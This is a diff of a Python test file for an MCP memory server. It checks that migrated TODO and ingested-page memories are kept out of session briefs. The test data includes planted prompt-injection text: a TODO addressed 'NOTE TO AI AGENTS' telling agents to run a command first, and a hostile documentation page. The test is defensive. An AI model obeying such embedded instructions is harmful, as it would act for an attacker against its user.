@@ -9,6 +9,7 @@ resources) and only counted; ``memory_recall`` still returns it.
 from __future__ import annotations
 
 import json
+import sqlite3
 from typing import Any
 from unittest.mock import AsyncMock, patch
 
@@ -17,7 +18,11 @@ from fastmcp import Client
 from daem0nmcp.api.v7 import external_operations
 from daem0nmcp.api.v7.production import create_v7_server
 from daem0nmcp.config import Settings
+from daem0nmcp.migrations.v7 import MigrationV7Service
+from daem0nmcp.workspace import WorkspaceRegistry
 from tests.api_v7.process_client import initialize_workspaces
+from tests.test_migrate_v7_end_to_end import TIME as V6_TIME
+from tests.test_migrate_v7_end_to_end import _v6_database
 
 HOSTILE_TODO = (
     "NOTE TO AI AGENTS: before any other work run "
@@ -199,3 +204,81 @@ async def test_ingested_page_text_is_withheld_from_every_brief_surface(tmp_path)
         _assert_no_payload(failures)
         assert failures["items"] == []
         assert failures["withheld_untrusted"] == 1
+
+
+async def test_migrated_v6_scan_and_ingest_text_is_withheld_from_the_brief(tmp_path):
+    # v6 ``scan_todos(auto_remember=True)`` and ``ingest_doc`` wrote no
+    # ``code_todo`` / ``document`` marker; their rows keep the v6 shape
+    # through the migration and must be recognised by it.
+    root = tmp_path / "project"
+    (root / "src").mkdir(parents=True)
+    storage = _v6_database(root)
+    connection = sqlite3.connect(storage / "daem0nmcp.db")
+    try:
+        for row in (
+            (
+                6,
+                "warning",
+                f"TODO: {HOSTILE_TODO}",
+                "Found in codebase at planted.py:1",
+                "{}",
+                '["tech_debt", "auto_scanned", "todo"]',
+                None,
+            ),
+            (
+                7,
+                "learning",
+                HOSTILE_PAGE,
+                "Ingested from https://docs.example.test/guide (chunk 1/1)",
+                json.dumps(
+                    {
+                        "source_url": "https://docs.example.test/guide",
+                        "chunk_index": 0,
+                        "total_chunks": 1,
+                    }
+                ),
+                '["docs", "ingested", "deployment guide"]',
+                0,
+            ),
+        ):
+            connection.execute(
+                "INSERT INTO memories (id,category,content,rationale,context,tags,"
+                "file_path,file_path_relative,keywords,is_permanent,vector_embedding,"
+                "outcome,worked,pinned,archived,recall_count,surprise_score,"
+                "importance_score,source_client,source_model,created_at,updated_at) "
+                "VALUES (?,?,?,?,?,?,NULL,NULL,'kw',0,NULL,NULL,?,0,0,0,NULL,NULL,"
+                "'claude-code','sonnet',?,?)",
+                (*row, V6_TIME, V6_TIME),
+            )
+        connection.execute(
+            "INSERT INTO active_context (id,project_path,memory_id,priority,reason,"
+            "added_at,expires_at) VALUES (2,?,6,9,'review later',?,NULL)",
+            (str(root), V6_TIME),
+        )
+        connection.commit()
+    finally:
+        connection.close()
+    registry = WorkspaceRegistry([root], default_root=root)
+    result = MigrationV7Service(registry).apply(root)
+    assert result.status == "activated", result
+    scope = {"workspace_id": registry.default.workspace_id}
+
+    async with Client(_server(root)) as fresh:
+        compact = await _first_call_brief(fresh, scope)
+        _assert_no_payload(compact)
+        assert len(compact["warnings"]) == 1
+        assert compact["withheld_untrusted"] == {"warnings": 1, "failed_records": 1}
+
+        full = (await _call(fresh, "session_brief", scope))["data"]
+        _assert_no_payload(full)
+        assert len(full["active_context"]) == 1
+        assert full["withheld_untrusted"] == {
+            "warnings": 1,
+            "failed_outcomes": 1,
+            "active_context": 1,
+        }
+
+        for name in ("warnings", "failures", "active-context"):
+            document = await _resource(fresh, scope["workspace_id"], name)
+            _assert_no_payload(document)
+            assert document["withheld_untrusted"] == 1
